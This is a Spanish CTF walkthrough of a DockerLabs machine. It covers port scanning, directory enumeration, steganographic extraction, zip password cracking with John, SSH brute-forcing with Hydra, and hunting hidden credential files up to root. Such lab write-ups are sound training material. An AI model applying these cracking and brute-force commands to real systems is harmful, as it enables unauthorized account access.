# Fase 1- Tanteo
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/b0cfed42-efee-48e5-b76e-e6f2f13f2b46)
En esta fase inicial, realizamos un escaneo de puertos para identificar los servicios disponibles en la máquina objetivo. Utilizamos la herramienta Nmap con una serie de opciones para obtener información detallada y realizar un análisis exhaustivo de los puertos abiertos.

### Comando Nmap utilizado:

`sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`

### Detalles del Comando:

- `sudo nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 192.168.52.139 -oN Escaneo`
- `-p-`: Escaneo de todos los puertos.
- `--open`: Muestra solo puertos abiertos.
- `-sS`: Escaneo SYN para determinar el estado de los puertos.
- `-sC`: Activa detección de versiones y vulnerabilidades.
- `-sV`: Escaneo de versiones de servicios.
- `--min-rate 5000`: Velocidad mínima de escaneo.
- `-vvv`: Verbosidad muy alta para información detallada.
- `-n`: Desactiva la resolución de DNS.
- `-Pn`: Ignora la detección de hosts en línea.
- `192.168.52.139`: IP de la máquina objetivo.
- `-oN Escaneo`: Guarda resultados en archivo "Escaneo".

### Resultados:

#### Puertos Abiertos:

1. **22/tcp (SSH ):** OpenSSH 6.6p1
2. **80/tcp (HTTP ):** Apache httpd 2.4.58

### Puerto 80
Al identificar que el puerto 80 estaba abierto durante el escaneo, se procedió a ingresar la dirección IP en el navegador. Esto llevó a acceder a la página por defecto de Apache Ubuntu.
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/a7bd1f19-8c35-4834-85df-a788b9eeb214)

# Fase 2- Exploración

#### feroxbuster
```python
301      GET        9l       28w      310c http://172.17.0.2/scripts
301      GET        9l       28w      310c http://172.17.0.2/spongebob/
```
Encontramos 2 directory listings.

#### /scripts
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/56b28ca2-870f-4bc8-ab4a-baedf6c4218d)

En el `/scripts` no hay nada muy interesante.

#### /spongebob
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/2793e34e-920d-4e60-8e1a-da43e9eb1191)

En `/spongebob` hay mas cosas interesantes...

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/ab0fa28a-167b-4d56-accc-1b48c814df88)

En la carpeta `/upload` encontramos una imagen.

#### jpg
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/a0b5f66a-7846-49aa-af1c-a759d787365b)
Descargamos la imagen y la escaneamos con la herramienta `stegseek`. Y nos trae un fichero.
Nos dice que el nombre original era `seguro.zip`. Asi que vamos a cambiarselo.

```python
❯ unzip seguro.zip
Archive:  seguro.zip
[seguro.zip] secreto.txt password:
```
Intentamos extraerlo pero nos pide una contraseña.

# Fase 3- Explotación

#### Password
Vamos a sacar el hash con zip2john, crackeamos y extraemos.
```python
> zip2john seguro.zip > hash1
> john --wordlist=/usr/share/wordlists/rockyou.txt hash1
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
chocolate        (seguro.zip/secreto.txt)     
1g 0:00:00:00 DONE (2024-06-23 17:20) 100.0g/s 409600p/s 409600c/s 409600C/s 123456..oooooo
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 
❯ unzip seguro.zip
Archive:  seguro.zip
[seguro.zip] secreto.txt password: 
 extracting: secreto.txt             
❯ cat secreto.txt
     │ File: secreto.txt      |
     |________________________|
   1 │ aprendemos             |
     |------------------------|
```
El contenido del `.zip` era un archivo llamado `secreto.txt` que contiene la palabra `aprendemos`.

#### Hydra
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/1845ce76-bae5-479f-ba1e-ab48abbe9d6c)
Encontramos el usuario `rosa` con la contraseña `aprendemos`. Comando utilizado:
```python
sudo hydra -L /usr/share/wordlists/rockyou.txt -p aprendemos ssh://172.17.0.2 -t 10
```

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/6eee99eb-0d2e-4d50-95c6-164e2313c5a0)
Y estamos dentro!.

# Fase 4- Privilegios

#### Sudo -l
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/cc01ef30-417a-4c06-82d1-0e74c3fa6806)

Despues de realizar el tratamiento de la TTY, no encontramos ningún binario que podamos usar para escalar, Tocara buscar.

#### -
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/fa42bc69-e18b-4dd0-b7d9-da58d91ee46b)
Hay un directorio en donde estoy un poco raro, que tiene muchas carpetas y un archivo .sh.

Utilizamos un comando para encontrar la contraseña:
```python
find ./- -type f -exec cat {} \; | grep -v x$
```

El resultado es:
```python
pedro:ell0c0
#!/bin/bash

 Buscamos directorios que empiezan con "busca"
for directorio in busca*; do
	# Comprobamos si el directorio existe
	if [ -d "$directorio" ]; then
		for i in {1..50}; do
			touch "$directorio/archivo$i" && echo "xxxxxx:xxxxxx" >$directorio/archivo$i
		done
		echo "Se crearon 50 archivos en $directorio"
	else
		echo "El directorio $directorio no existe"
	fi
done
```
Este comando busca todos los archivos en el directorio actual y muestra el contenido de cada archivo, pero excluye las líneas que terminan con la letra "x". De esta forma encontramos la contraseña para el usuario `pedro`.

#### Pedro
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/82a1390d-b919-446c-886a-d3a14e2050c8)

Como el usuario `pedro` no tenemos ningún binario disponible para poder escalar, Tocara buscar.

#### ...
```python
pedro@2203e11d1fc7:~$ ls -a
.  ..  ...  .bash_logout  .bashrc  .cache  .local  .profile
pedro@2203e11d1fc7:~$ 
```
Explorando note un directorio un poco raro...

Tiene un archivo llamado `.misecreto`.
```python
pedro@2203e11d1fc7:~$ ls -a ...
.  ..  .misecreto
pedro@2203e11d1fc7:~$ 
```

Tendremos que buscar...
```python
pedro@2203e11d1fc7:~$ cat .../.misecreto
Consegui el pass de juan y lo tengo escondido en algun lugar del sistema fuera de mi home.
```


```python
pedro@fda7befa890c:~$ find / -name "*juan*" -type f 2> /dev/null 
/var/mail/.pass_juan
/usr/share/zoneinfo/America/Tijuana
pedro@fda7befa890c:~$ cat /var/mail/.pass_juan 
ZWxwcmVzaW9uZXMK
pedro@fda7befa890c:~$ 
```
Usamos este comando para buscar de forma recursiva en el sistema de archivos ("/") todos los archivos ("-type f") cuyo nombre contenga "juan" ("-name "_juan_"") y redirige los errores ("2>") al dispositivo nulo ("/dev/null").

![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/5efe40cc-55e8-4aea-8329-7c8ab0f04394)

Y de esta forma pasamos al usuario `juan`.

#### Juan
![image](https://github.com/haw441kings/DockerLabsWriteUps/assets/136659799/d94b725d-9a33-4914-9fd2-8abb4aa12214)
Encontramos un archivo llamado `.ordenes_nuevas`, Dicho archivo tiene un mensaje que nos dice que tenemos el pass del usuario `root` a mano.

```python
juan@fda7befa890c:~$ alias
alias alert='notify-send --urgency=low -i "$([ $? = 0 ] && echo terminal || echo error)" "$(history|tail -n1|sed -e '\''s/^\s*[0-9]\+\s*//;s/[;&|]\s*alert$//'\'')"'
alias egrep='egrep --color=auto'
alias fgrep='fgrep --color=auto'
alias grep='grep --color=auto'
alias l='ls -CF'
alias la='ls -A'
alias ll='ls -alF'
alias ls='ls --color=auto'
alias pass='eljefe'
juan@fda7befa890c:~$ pass
bash: eljefe: command not found
juan@fda7befa890c:~$ su root
Password: 
root@fda7befa890c:/home/juan# 
```
En ese caso específico, usamos el comando "alias" se usa para definir alias personalizados para comandos en el shell de Unix/Linux. Por ejemplo:

- `l`, `la`, `ll`, y `ls` son alias para el comando `ls` con diferentes opciones de formato y visualización.
- `pass` es un alias para un comando o programa llamado "eljefe".

Usamos la contraseña `eljefe` y podemos escalar a root!.

